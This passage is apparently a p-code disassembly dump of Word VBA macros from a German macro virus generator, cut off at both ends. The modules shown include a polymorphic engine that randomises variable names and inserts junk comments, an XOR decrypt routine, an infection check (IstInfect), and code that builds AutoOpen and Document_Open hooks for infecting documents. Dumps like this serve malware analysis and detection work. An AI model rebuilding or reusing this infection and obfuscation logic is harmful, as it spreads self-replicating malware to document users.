' 	LitOI2 0x0000 
' 	St x 
' Line #98:
' 	Do 
' Line #99:
' 	Ld VStart 
' 	Ld x 
' 	Add 
' 	St VStart 
' Line #100:
' 	LitDI2 0x0001 
' 	Ld Code 
' 	Ld VStart 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld VEnde 
' 	Ld VStart 
' 	Sub 
' 	Paren 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Trim 0x0001 
' 	Ld vbCr 
' 	FnInStr3 
' 	St x 
' Line #101:
' 	Ld x 
' 	LitDI2 0x0000 
' 	Eq 
' 	LoopUntil 
' Line #102:
' 	Ld VStart 
' 	LitDI2 0x0001 
' 	Add 
' 	St VStart 
' Line #103:
' 	EndIfBlock 
' Line #104:
' Line #105:
' 	Ld VEnde 
' 	Ld VStart 
' 	Sub 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #106:
' 	Ld Code 
' 	Ld VStart 
' 	Ld VEnde 
' 	Ld VStart 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Trim 0x0001 
' 	St TmpStr 
' Line #107:
' 	Ld Code 
' 	Ld TmpStr 
' 	ArgsLd VarVerschlüsseln 0x0002 
' 	St Code 
' Line #108:
' 	ElseBlock 
' 	BoS 0x0000 
' 	ExitDo 
' Line #109:
' 	EndIfBlock 
' Line #110:
' 	Ld VStart 
' 	Ld Code 
' 	LitOI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Ld vbCr 
' 	Concat 
' 	FnInStr3 
' 	LitDI2 0x0002 
' 	Add 
' 	St VStart 
' Line #111:
' 	Loop 
' Line #112:
' 	EndSub 
' Line #113:
' Line #114:
' 	FuncDefn (Private Function VarVerschlüsseln(ByVal Code As String, VarName As String) As String)
' Line #115:
' 	Dim 
' 	VarDefn x (As Long)
' 	VarDefn NewVarName (As String)
' Line #116:
' 	Ld GetNewBez 
' 	St NewVarName 
' Line #117:
' 	LitOI2 0x0000 
' 	Ld NewVarName 
' 	FnLen 
' 	Sub 
' 	St x 
' Line #118:
' 	Ld x 
' 	LitDI2 0x0000 
' 	Ne 
' 	DoWhile 
' Line #119:
' 	Ld x 
' 	Ld NewVarName 
' 	FnLen 
' 	Add 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld Code 
' 	Ld VarName 
' 	FnInStr3 
' 	St x 
' Line #120:
' 	Ld x 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld Code 
' 	Ld x 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld NewVarName 
' 	Concat 
' 	Ld Code 
' 	Ld Code 
' 	FnLen 
' 	Ld x 
' 	Ld VarName 
' 	FnLen 
' 	Add 
' 	Paren 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	ArgsLd Right 0x0002 
' 	Concat 
' 	St Code 
' 	EndIf 
' Line #121:
' 	Loop 
' Line #122:
' 	Ld Code 
' 	St VarVerschlüsseln 
' Line #123:
' 	EndFunc 
' Line #124:
' Line #125:
' Macros/VBA/SubModul - 12600 bytes
' Line #0:
' 	Option  (Explicit)
' Line #1:
' Line #2:
' 	Type TDatum
' Line #3:
' 	DimImplicit 
' 	VarDefn Tag (As Byte)
' Line #4:
' 	DimImplicit 
' 	VarDefn Monat (As Byte)
' Line #5:
' 	DimImplicit 
' 	VarDefn JedenTag (As Boolean)
' Line #6:
' 	DimImplicit 
' 	VarDefn JedenMonat (As Boolean)
' Line #7:
' 	DimImplicit 
' 	VarDefn OK (As Boolean)
' Line #8:
' 	DimImplicit 
' 	VarDefn Auswahl (As Boolean)
' Line #9:
' 	EndType 
' Line #10:
' Line #11:
' 	Type TZufall
' Line #12:
' 	DimImplicit 
' 	VarDefn Randomize (As Long)
' Line #13:
' 	DimImplicit 
' 	VarDefn OK (As Boolean)
' Line #14:
' 	DimImplicit 
' 	VarDefn Auswahl (As Boolean)
' Line #15:
' 	EndType 
' Line #16:
' Line #17:
' 	Type TTextBox
' Line #18:
' 	DimImplicit 
' 	VarDefn Title (As String)
' Line #19:
' 	DimImplicit 
' 	VarDefn Prompt (As String)
' Line #20:
' 	DimImplicit 
' 	VarDefn Symbol (As Byte)
' Line #21:
' 	DimImplicit 
' 	VarDefn SymbolAktiv (As Boolean)
' Line #22:
' 	DimImplicit 
' 	VarDefn OK (As Boolean)
' Line #23:
' 	DimImplicit 
' 	VarDefn Datum
' Line #24:
' 	DimImplicit 
' 	VarDefn DatumWahl (As Boolean)
' Line #25:
' 	DimImplicit 
' 	VarDefn Zufall (As TZufall)
' Line #26:
' 	DimImplicit 
' 	VarDefn ZufallWahl (As Boolean)
' Line #27:
' 	EndType 
' Line #28:
' Line #29:
' 	Type THyperLink
' Line #30:
' 	DimImplicit 
' 	VarDefn Link (As String)
' Line #31:
' 	DimImplicit 
' 	VarDefn OK (As Boolean)
' Line #32:
' 	DimImplicit 
' 	VarDefn Datum
' Line #33:
' 	DimImplicit 
' 	VarDefn DatumWahl (As Boolean)
' Line #34:
' 	DimImplicit 
' 	VarDefn Zufall (As TZufall)
' Line #35:
' 	DimImplicit 
' 	VarDefn ZufallWahl (As Boolean)
' Line #36:
' 	EndType 
' Line #37:
' Line #38:
' 	Type TReplace
' Line #39:
' 	DimImplicit 
' 	VarDefn Orginal (As String)
' Line #40:
' 	DimImplicit 
' 	VarDefn Replace (As String)
' Line #41:
' 	DimImplicit 
' 	VarDefn GanzesWort (As Boolean)
' Line #42:
' 	DimImplicit 
' 	VarDefn OK (As Boolean)
' Line #43:
' 	DimImplicit 
' 	VarDefn Datum
' Line #44:
' 	DimImplicit 
' 	VarDefn DatumWahl (As Boolean)
' Line #45:
' 	DimImplicit 
' 	VarDefn Zufall (As TZufall)
' Line #46:
' 	DimImplicit 
' 	VarDefn ZufallWahl (As Boolean)
' Line #47:
' 	EndType 
' Line #48:
' Line #49:
' 	Type TAkivDocDel
' Line #50:
' 	DimImplicit 
' 	VarDefn OK (As Boolean)
' Line #51:
' 	DimImplicit 
' 	VarDefn Datum
' Line #52:
' 	DimImplicit 
' 	VarDefn DatumWahl (As Boolean)
' Line #53:
' 	DimImplicit 
' 	VarDefn Zufall (As TZufall)
' Line #54:
' 	DimImplicit 
' 	VarDefn ZufallWahl (As Boolean)
' Line #55:
' 	EndType 
' Line #56:
' Line #57:
' 	Type TStartProcedure
' Line #58:
' 	DimImplicit 
' 	VarDefn DocNew (As Boolean)
' Line #59:
' 	DimImplicit 
' 	VarDefn DocOpen (As Boolean)
' Line #60:
' 	DimImplicit 
' 	VarDefn DocClose (As Boolean)
' Line #61:
' 	DimImplicit 
' 	VarDefn AutoNew (As Boolean)
' Line #62:
' 	DimImplicit 
' 	VarDefn AutoOpen (As Boolean)
' Line #63:
' 	DimImplicit 
' 	VarDefn AutoClose (As Boolean)
' Line #64:
' 	EndType 
' Line #65:
' Line #66:
' 	Dim (Public) 
' 	VarDefn Dat_TextBox (As TTextBox)
' Line #67:
' 	Dim (Public) 
' 	VarDefn Dat_Datum
' Line #68:
' 	Dim (Public) 
' 	VarDefn Dat_HyperLink (As THyperLink)
' Line #69:
' 	Dim (Public) 
' 	VarDefn Dat_Zufall (As TZufall)
' Line #70:
' 	Dim (Public) 
' 	VarDefn Dat_Replace (As TReplace)
' Line #71:
' 	Dim (Public) 
' 	VarDefn Dat_AkivDocDel (As TAkivDocDel)
' Line #72:
' 	Dim (Public) 
' 	VarDefn StartProcedure (As TStartProcedure)
' Line #73:
' Line #74:
' 	Dim (Public Const) 
' 	LitStr 0x000C "Mister Spock"
' 	VarDefn EsIstIch
' Line #75:
' 	Dim (Public Const) 
' 	LitStr 0x0044 "Es dürfen nur ASC-Zeichen im Bereich von 0 bis 127 verwendet werden."
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x005A "Zeichen im Bereich von 128 bis 255 wie ä, ö und ü können nicht Codiert gespeichert werden."
' 	Concat 
' 	VarDefn CodeChar_ERROR
' Line #76:
' 	Dim (Public Const) 
' 	LitStr 0x0006 "FEHLER"
' 	VarDefn Title_ERROR
' Line #77:
' Line #78:
' 	FuncDefn (Public Sub Startup())
' Line #79:
' 	Ld MainUserForm 
' 	ArgsMemCall Show 0x0000 
' Line #80:
' 	EndSub 
' Line #81:
' Line #82:
' 	FuncDefn (Public Sub ToolsStartup())
' Line #83:
' 	Ld Tools 
' 	ArgsMemCall Show 0x0000 
' Line #84:
' 	EndSub 
' Line #85:
' Line #86:
' 	FuncDefn (Public Function DeCrypt(ByVal s As String, ByVal Schlüssel As String) As String)
' Line #87:
' 	Dim 
' 	VarDefn x (As Byte)
' Line #88:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld s 
' 	FnLen 
' 	For 
' Line #89:
' 	Ld DeCrypt 
' 	Ld s 
' 	Ld x 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	Ld Schlüssel 
' 	Ld x 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	Xor 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St DeCrypt 
' Line #90:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #91:
' 	EndFunc 
' Line #92:
' Line #93:
' 	FuncDefn (Public Function GetMonatsName(ByVal Monat As Byte) As String)
' Line #94:
' 	Ld Monat 
' 	SelectCase 
' Line #95:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x000A " Januar   "
' 	St GetMonatsName 
' Line #96:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x000A " Februar  "
' 	St GetMonatsName 
' Line #97:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x000A " März     "
' 	St GetMonatsName 
' Line #98:
' 	LitDI2 0x0004 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x000A " April    "
' 	St GetMonatsName 
' Line #99:
' 	LitDI2 0x0005 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x000A " Mai      "
' 	St GetMonatsName 
' Line #100:
' 	LitDI2 0x0006 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x000A " Juni     "
' 	St GetMonatsName 
' Line #101:
' 	LitDI2 0x0007 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x000A " Juli     "
' 	St GetMonatsName 
' Line #102:
' 	LitDI2 0x0008 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x000A " August   "
' 	St GetMonatsName 
' Line #103:
' 	LitDI2 0x0009 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x000A " September"
' 	St GetMonatsName 
' Line #104:
' 	LitDI2 0x000A 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x000A " Oktober  "
' 	St GetMonatsName 
' Line #105:
' 	LitDI2 0x000B 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x000A " November "
' 	St GetMonatsName 
' Line #106:
' 	LitDI2 0x000C 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x000A " Dezember "
' 	St GetMonatsName 
' Line #107:
' 	EndSelect 
' Line #108:
' 	EndFunc 
' Line #109:
' Line #110:
' 	FuncDefn (Public Function GET_Kommentar() As String)
' Line #111:
' 	Dim 
' 	VarDefn s (As String)
' 	VarDefn x (As Long)
' Line #112:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #113:
' 	Ld Rnd 
' 	LitOI2 0x0009 
' 	Mul 
' 	FnInt 
' 	LitOI2 0x0001 
' 	Add 
' 	LitOI2 0x0008 
' 	Gt 
' 	IfBlock 
' 	QuoteRem 0x0026 0x0009 "Kommentar"
' Line #114:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitOI2 0x0000 
' 	Ld Rnd 
' 	LitOI2 0x0009 
' 	Mul 
' 	FnInt 
' 	LitOI2 0x0001 
' 	Add 
' 	For 
' 	BoS 0x0000 
' 	Ld s 
' 	Ld Rnd 
' 	Ld Rnd 
' 	LitOI2 0x2710 
' 	Mul 
' 	Paren 
' 	Mul 
' 	Concat 
' 	Ld vbTab 
' 	Concat 
' 	St s 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #115:
' 	Ld vbCr 
' 	Ld Rnd 
' 	LitOI2 0x000A 
' 	Mul 
' 	FnInt 
' 	LitOI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	ArgsLd String$ 0x0002 
' 	Concat 
' 	LitOI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld s 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St s 
' Line #116:
' 	Ld Rnd 
' 	LitOI2 0x000A 
' 	Mul 
' 	FnInt 
' 	LitOI2 0x0001 
' 	Add 
' 	LitOI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld s 
' 	Ld vbCr 
' 	Concat 
' 	St s 
' 	EndIf 
' 	QuoteRem 0x0033 0x001C "Zeilenumbruch nach Kommentar"
' Line #117:
' 	ElseBlock 
' 	BoS 0x0000 
' 	Ld vbCr 
' 	St s 
' Line #118:
' 	EndIfBlock 
' Line #119:
' 	Ld Rnd 
' 	LitOI2 0x000A 
' 	Mul 
' 	FnInt 
' 	LitOI2 0x0001 
' 	Add 
' 	LitOI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld s 
' 	Ld vbCr 
' 	Concat 
' 	St s 
' 	EndIf 
' 	QuoteRem 0x0032 0x000D "Zeilenumbruch"
' Line #120:
' 	Ld s 
' 	Ld Rnd 
' 	LitOI2 0x000A 
' 	Mul 
' 	FnInt 
' 	LitOI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	ArgsLd String$ 0x0002 
' 	Concat 
' 	St s 
' 	QuoteRem 0x002C 0x0010 "neue Leerzeichen"
' Line #121:
' 	Ld s 
' 	St GET_Kommentar 
' Line #122:
' 	EndFunc 
' Line #123:
' Line #124:
' 	FuncDefn (Public Function GetNewBez() As String)
' Line #125:
' 	Dim 
' 	VarDefn NewBez (As String)
' 	VarDefn x (As Long)
' Line #126:
' 	Label Start 
' Line #127:
' 	Ld Rnd 
' 	LitOI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitOI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	St NewBez 
' Line #128:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitOI2 0x0001 
' 	Ld Rnd 
' 	LitOI2 0x0004 
' 	Mul 
' 	FnInt 
' 	LitOI2 0x0004 
' 	Add 
' 	For 
' Line #129:
' 	Ld Rnd 
' 	LitOI2 0x0003 
' 	Mul 
' 	Paren 
' 	LitOI2 0x0001 
' 	Add 
' 	FnInt 
' 	SelectCase 
' Line #130:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld NewBez 
' 	Ld Rnd 
' 	LitOI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitOI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St NewBez 
' Line #131:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld NewBez 
' 	Ld Rnd 
' 	LitOI2 0x000A 
' 	Mul 
' 	FnInt 
' 	LitOI2 0x0030 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St NewBez 
' Line #132:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld NewBez 
' 	Ld Rnd 
' 	LitOI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitOI2 0x0061 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St NewBez 
' Line #133:
' 	EndSelect 
' Line #134:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #135:
' 	LitOI2 0x0001 
' 	Ld VirusCodeBuffer 
' 	Ld NewBez 
' 	FnInStr3 
' 	LitOI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	GoTo Start 
' 	EndIf 
' Line #136:
' 	Ld NewBez 
' 	St GetNewBez 
' Line #137:
' 	EndFunc 
' Line #138:
' Line #139:
' 	FuncDefn (Public Function SaveAs(Doc As Object) As Boolean)
' Line #140:
' 	LitVarSpecial (False)
' 	St SaveAs 
' Line #141:
' 	Ld Doc 
' 	ArgsMemCall Activate 0x0000 
' Line #142:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #143:
' 	LitVarSpecial (True)
' 	St SaveAs 
' Line #144:
' 	ElseBlock 
' 	BoS 0x0000 
' 	LitStr 0x0027 "Dokument wurde nicht gespeichert !!!   "
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x001A "Vorgang wurde abgebrochen."
' 	Concat 
' 	Ld vbCritical 
' 	Ld EsIstIch 
' 	LitStr 0x000A " - Abbruch"
' 	Concat 
' 	ArgsCall MsgBox 0x0003 
' Line #145:
' 	EndIfBlock 
' Line #146:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt Visible 
' Line #147:
' 	EndFunc 
' Line #148:
' Line #149:
' 	FuncDefn (Public Function IstInfect(Doc As Object) As Boolean)
' Line #150:
' 	Dim 
' 	VarDefn Obj (As Object)
' 	VarDefn z1 (As Long)
' 	VarDefn z2 (As Long)
' 	VarDefn VStart (As Long)
' 	VarDefn VEnde (As Long)
' 	VarDefn TmpStr (As String)
' Line #151:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld Doc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set Obj 
' Line #152:
' 	StartWithExpr 
' 	Ld Obj 
' 	With 
' Line #153:
' 	LitOI2 0x0000 
' 	St z1 
' Line #154:
' 	LitOI2 0x0000 
' 	St VStart 
' Line #155:
' 	LitStr 0x0004 "Sub "
' 	Ld VStart 
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0001 
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	ArgsMemLdWith Find 0x0008 
' 	IfBlock 
' Line #156:
' 	LitStr 0x0006 "Const "
' 	Ld VStart 
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0001 
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	ArgsMemLdWith Find 0x0008 
' 	IfBlock 
' Line #157:
' 	Ld VStart 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	Ld VStart 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	LitOI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	FnInStr 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Mid$ 0x0002 
' 	St TmpStr 
' Line #158:
' 	Ld TmpStr 
' 	LitOI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #159:
' 	Ld TmpStr 
' 	Ld TmpStr 
' 	LitOI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	FnInStr 
' 	ArgsLd LBound 0x0002 
' 	St TmpStr 
' Line #160:
' 	StartForVariable 
' 	Ld z2 
' 	EndForVariable 
' 	LitOI2 0x0001 
' 	Ld TmpStr 
' 	FnLen 
' 	LitOI2 0x0001 
' 	Sub 
' 	For 
' 	BoS 0x0000 
' 	Ld vbCr 
' 	Ld z1 
' 	Ld TmpStr 
' 	Ld z2 
' 	LitOI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	Add 
' 	Concat 
' 	St z1 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld z2 
' 	EndForVariable 
' 	NextVar 
' Line #161:
' 	EndIfBlock 
' Line #162:
' 	EndIfBlock 
' Line #163:
' 	EndIfBlock 
' Line #164:
' 	Ld z1 
' 	LitOI2 0x46D6 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #165:
' 	EndWith 
' Line #166:
' 	EndIfBlock 
' Line #167:
' Line #168:
' 	EndFunc 
' Line #169:
' Line #170:
' Macros/VBA/VirusCodeModul - 73785 bytes
' Line #0:
' 	Option  (Explicit)
' Line #1:
' Line #2:
' 	Dim (Const) 
' 	LitStr 0x0063 "Ï’ïžÐ¬¡¾€ŒóÃˆ”Êš­™°ë¶ Â³½÷«‡‚�Ñ“•à‘¤†�íÿÈ„�¸À�òèÍ´‹ì§¯ÌùËŸð¥·»¢˜ºç�›á¨õåŽø¿¦²©—ãâªƒ±êÓ¼œÇúÄŠ£ÅÁ®µ¹‰"
' 	VarDefn VS
' Line #3:
' 	Dim (Public) 
' 	OptionBase 
' 	LitDI2 0x0009 
' 	VarDefn Modul1 (As String)
' Line #4:
' 	Dim (Public) 
' 	OptionBase 
' 	LitDI2 0x001D 
' 	VarDefn Modul2 (As String)
' Line #5:
' 	Dim (Public) 
' 	OptionBase 
' 	LitDI2 0x0003 
' 	VarDefn Modul3 (As String)
' Line #6:
' 	Dim (Public) 
' 	OptionBase 
' 	LitDI2 0x000F 
' 	VarDefn Modul4 (As String)
' Line #7:
' 	Dim (Public) 
' 	OptionBase 
' 	LitDI2 0x002B 
' 	VarDefn Modul5 (As String)
' Line #8:
' 	Dim (Public) 
' 	OptionBase 
' 	LitDI2 0x0007 
' 	VarDefn Modul6 (As String)
' Line #9:
' 	Dim (Public) 
' 	OptionBase 
' 	LitDI2 0x0012 
' 	VarDefn Modul7 (As String)
' Line #10:
' 	Dim (Public) 
' 	OptionBase 
' 	LitDI2 0x0010 
' 	VarDefn Modul8 (As String)
' Line #11:
' 	Dim (Public) 
' 	OptionBase 
' 	LitDI2 0x000C 
' 	VarDefn Modul9 (As String)
' Line #12:
' 	Dim (Public) 
' 	OptionBase 
' 	LitDI2 0x0010 
' 	VarDefn Modul10 (As String)
' Line #13:
' 	Dim (Public) 
' 	OptionBase 
' 	LitDI2 0x000C 
' 	VarDefn Modul11 (As String)
' Line #14:
' 	Dim (Public) 
' 	OptionBase 
' 	LitDI2 0x000B 
' 	VarDefn Modul12 (As String)
' Line #15:
' 	Dim (Public) 
' 	OptionBase 
' 	LitDI2 0x0010 
' 	VarDefn Modul13 (As String)
' Line #16:
' 	Dim (Public) 
' 	OptionBase 
' 	LitDI2 0x000A 
' 	VarDefn Modul14 (As String)
' Line #17:
' 	Dim (Public) 
' 	OptionBase 
' 	LitDI2 0x0012 
' 	VarDefn Modul15 (As String)
' Line #18:
' 	Dim (Public) 
' 	OptionBase 
' 	LitDI2 0x0010 
' 	VarDefn Modul16 (As String)
' Line #19:
' 	Dim (Public) 
' 	OptionBase 
' 	LitDI2 0x000A 
' 	VarDefn Modul17 (As String)
' Line #20:
' 	Dim (Public) 
' 	OptionBase 
' 	LitDI2 0x0007 
' 	VarDefn Modul18 (As String)
' Line #21:
' 	Dim (Public) 
' 	OptionBase 
' 	LitDI2 0x0005 
' 	VarDefn Modul19 (As String)
' Line #22:
' 	Dim (Public) 
' 	OptionBase 
' 	LitDI2 0x0005 
' 	VarDefn Modul20 (As String)
' Line #23:
' 	Dim (Public) 
' 	OptionBase 
' 	LitDI2 0x000A 
' 	VarDefn Modul21 (As String)
' Line #24:
' 	Dim (Public) 
' 	OptionBase 
' 	LitDI2 0x0008 
' 	VarDefn Modul22 (As String)
' Line #25:
' 	Dim (Public) 
' 	OptionBase 
' 	LitDI2 0x001A 
' 	VarDefn Modul23 (As String)
' Line #26:
' Line #27:
' 	Dim 
' 	VarDefn CodeKopf (As String)
' Line #28:
' 	Dim 
' 	VarDefn CodeFuss (As String)
' Line #29:
' Line #30:
' 	Dim (Const) 
' 	LitStr 0x0011 "Sub Document_Open"
' 	VarDefn STR_DocumentOpen
' Line #31:
' 	Dim (Const) 
' 	LitStr 0x0012 "Sub Document_Close"
' 	VarDefn STR_DocumentClose
' Line #32:
' 	Dim (Const) 
' 	LitStr 0x0010 "Sub Document_New"
' 	VarDefn STR_DocumentNew
' Line #33:
' 	Dim (Const) 
' 	LitStr 0x000C "Sub AutoOpen"
' 	VarDefn STR_AutoOpen
' Line #34:
' 	Dim (Const) 
' 	LitStr 0x000D "Sub AutoClose"
' 	VarDefn STR_AutoClose
' Line #35:
' 	Dim (Const) 
' 	LitStr 0x000B "Sub AutoNew"
' 	VarDefn STR_AutoNew
' Line #36:
' Line #37:
' 	Dim 
' 	VarDefn ProcCount (As Byte)
' Line #38:
' 	Dim 
' 	VarDefn Start_Proceduren (As String)
' Line #39:
' 	Dim 
' 	VarDefn Start_Procedure_Name (As String)
' Line #40:
' Line #41:
' 	Dim (Public) 
' 	VarDefn VirusCodeBuffer (As String)
' Line #42:
' 	Dim (Public) 
' 	VarDefn ZielDocument (As Object)
' Line #43:
' Line #44:
' 	FuncDefn (Sub Generator_Run())
' Line #45:
' 	Dim 
' 	VarDefn ProcBuf (As String)
' 	VarDefn NewCode (As String)
' Line #46:
' 	OnError Fehler1 
' Line #47:
' 	ArgsCall Init_Module 0x0000 
' Line #48:
' 	ArgsCall Init_PlayLoad 0x0000 
' Line #49:
' 	Ld GetNewBez 
' 	St Start_Procedure_Name 
' Line #50:
' 	LitDI2 0x0000 
' 	St ProcCount 
' Line #51:
' 	LitStr 0x0000 ""
' 	St ProcBuf 
' Line #52:
' Line #53:
' 	Ld vbCr 
' 	St Start_Proceduren 
' Line #54:
' 	Ld StartProcedure 
' 	MemLd DocNew 
' 	IfBlock 
' Line #55:
' 	Ld ProcBuf 
' 	Ld STR_DocumentNew 
' 	ArgsLd Procedute_hinzufügen 0x0002 
' 	Ld vbCr 
' 	Concat 
' 	Ld GET_Kommentar 
' 	Concat 
' 	St ProcBuf 
' Line #56:
' 	Ld Start_Proceduren 
' 	LitStr 0x0008 "Private "
' 	Concat 
' 	Ld STR_DocumentNew 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	Ld Start_Procedure_Name 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St Start_Proceduren 
' Line #57:
' 	EndIfBlock 
' Line #58:
' Line #59:
' 	Ld StartProcedure 
' 	MemLd DocOpen 
' 	IfBlock 
' Line #60:
' 	Ld ProcBuf 
' 	Ld STR_DocumentOpen 
' 	ArgsLd Procedute_hinzufügen 0x0002 
' 	Ld vbCr 
' 	Concat 
' 	Ld GET_Kommentar 
' 	Concat 
' 	St ProcBuf 
' Line #61:
' 	Ld Start_Proceduren 
' 	LitStr 0x0008 "Private "
' 	Concat 
' 	Ld STR_DocumentOpen 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	Ld Start_Procedure_Name 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St Start_Proceduren 
' Line #62:
' 	EndIfBlock 
' Line #63:
' Line #64:
' 	Ld StartProcedure 
' 	MemLd DocClose 
' 	IfBlock 
' Line #65:
' 	Ld ProcBuf 
' 	Ld STR_DocumentClose 
' 	ArgsLd Procedute_hinzufügen 0x0002 
' 	Ld vbCr 
' 	Concat 
' 	Ld GET_Kommentar 
' 	Concat 
' 	St ProcBuf 
' Line #66:
' 	Ld Start_Proceduren 
' 	LitStr 0x0008 "Private "
' 	Concat 
' 	Ld STR_DocumentClose 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	Ld Start_Procedure_Name 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St Start_Proceduren 
' Line #67:
' 	EndIfBlock 
' Line #68:
' Line #69:
' 	Ld StartProcedure 
' 	MemLd AutoNew 
' 	IfBlock 
' Line #70:
' 	Ld ProcBuf 
' 	Ld STR_AutoNew 
' 	ArgsLd Procedute_hinzufügen 0x0002 
' 	Ld vbCr 
' 	Concat 
' 	Ld GET_Kommentar 
' 	Concat 
' 	St ProcBuf 
' Line #71:
' 	Ld Start_Proceduren 
' 	LitStr 0x0008 "Private "
' 	Concat 
' 	Ld STR_AutoNew 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	Ld Start_Procedure_Name 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St Start_Proceduren 
' Line #72:
' 	EndIfBlock 
' Line #73:
' Line #74:
' 	Ld StartProcedure 
' 	MemLd AutoOpen 
' 	IfBlock 
' Line #75:
' 	Ld ProcBuf 
' 	Ld STR_AutoOpen 
' 	ArgsLd Procedute_hinzufügen 0x0002 
' 	Ld vbCr 
' 	Concat 
' 	Ld GET_Kommentar 
' 	Concat 
' 	St ProcBuf 
' Line #76:
' 	Ld Start_Proceduren 
